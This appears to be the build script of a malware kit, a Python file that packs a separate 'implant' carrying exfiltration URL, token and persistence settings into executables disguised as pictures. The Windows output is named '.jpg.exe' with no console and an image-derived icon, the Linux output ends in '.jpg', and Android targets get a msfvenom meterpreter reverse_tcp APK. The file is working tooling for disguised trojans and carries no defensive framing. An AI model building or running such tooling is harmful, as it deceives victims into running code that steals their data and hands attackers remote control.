# ddsmat/builds.py
import os
import re
import json
import shutil
import subprocess
import tempfile
import time
from pathlib import Path

BASE = Path(__file__).parent
IMPLANT = BASE / "implant.py"
CONFIG  = BASE / "config.json"
CONFIG_EXAMPLE = BASE / "config.example.json"


def _safe(name):
    return re.sub(r"[^A-Za-z0-9._-]", "_", name)


def _load_config():
    for p in (CONFIG, CONFIG_EXAMPLE):
        if p.exists():
            return json.loads(p.read_text())
    return {"exfil_url": "", "exfil_token": "", "persist": True}


def _png_to_ico(png: Path, ico: Path):
    from PIL import Image
    img = Image.open(png).convert("RGBA")
    img.save(ico, sizes=[(16,16),(32,32),(48,48),(64,64),(128,128),(256,256)])


def _bake(implant_src: Path, out: Path):
    cfg = _load_config()
    src = implant_src.read_text()
    src = src.replace("CONFIG_JSON = {}",
                      f"CONFIG_JSON = {json.dumps(cfg)!r}")
    out.write_text(src)
    return out


def _pyinstaller(src_py: Path, ico, name: str, out_dir: Path, windows: bool) -> Path:
    work = Path(tempfile.mkdtemp())
    spec = _safe(name)
    cmd = ["pyinstaller", "--onefile", "--clean",
           "--name", spec,
           "--distpath", str(out_dir),
           "--workpath", str(work / "b"),
           "--specpath", str(work / "s")]
    if windows:
        cmd.append("--noconsole")
        if ico:
            cmd += ["--icon", str(ico)]
    cmd.append(str(src_py))
    r = subprocess.run(cmd, capture_output=True, text=True)
    if r.returncode != 0:
        raise RuntimeError(f"pyinstaller: {r.stderr[-400:]}")
    for c in out_dir.glob(f"{spec}*"):
        if c.is_file():
            return c
    raise RuntimeError("pyinstaller produced nothing")


def _has(cmd):
    return shutil.which(cmd) is not None


def build(image_path: Path, base_name: str, target: str, out_dir: Path):
    out_dir = Path(out_dir); out_dir.mkdir(parents=True, exist_ok=True)

    if not IMPLANT.exists():
        raise RuntimeError(f"missing implant.py ({IMPLANT})")

    baked = out_dir / f".baked_{int(time.time())}_{base_name}.py"
    _bake(IMPLANT, baked)

    ico = out_dir / f"{_safe(base_name)}.ico"
    try:
        _png_to_ico(image_path, ico)
    except Exception:
        ico = None

    if target == "windows":
        if not _has("pyinstaller"):
            baked.unlink(missing_ok=True)
            raise RuntimeError("pip install pyinstaller")
        exe = _pyinstaller(baked, ico, _safe(base_name), out_dir, windows=True)
        display = f"{_safe(base_name)}.jpg.exe"
        final = out_dir / display
        shutil.move(str(exe), str(final))

    elif target == "linux":
        if not _has("pyinstaller"):
            baked.unlink(missing_ok=True)
            raise RuntimeError("pip install pyinstaller")
        binp = _pyinstaller(baked, ico, _safe(base_name), out_dir, windows=False)
        display = f"{_safe(base_name)}.jpg"
        final = out_dir / display
        shutil.move(str(binp), str(final))
        final.chmod(0o755)

    elif target == "android":
        if not _has("msfvenom"):
            baked.unlink(missing_ok=True)
            raise RuntimeError("android needs msfvenom: pkg install metasploit")
        apk = out_dir / f"{_safe(base_name)}.apk"
        r = subprocess.run(
            ["msfvenom", "-p", "android/meterpreter/reverse_tcp",
             "LHOST=127.0.0.1", "LPORT=4444",
             "-o", str(apk), "--arch", "dalvik"],
            capture_output=True, text=True)
        if r.returncode != 0:
            baked.unlink(missing_ok=True)
            raise RuntimeError(f"msfvenom: {r.stderr[-300:]}")
        final, display = apk, apk.name

    else:
        baked.unlink(missing_ok=True)
        raise ValueError(f"unknown target {target}")

    baked.unlink(missing_ok=True)
    return final, display
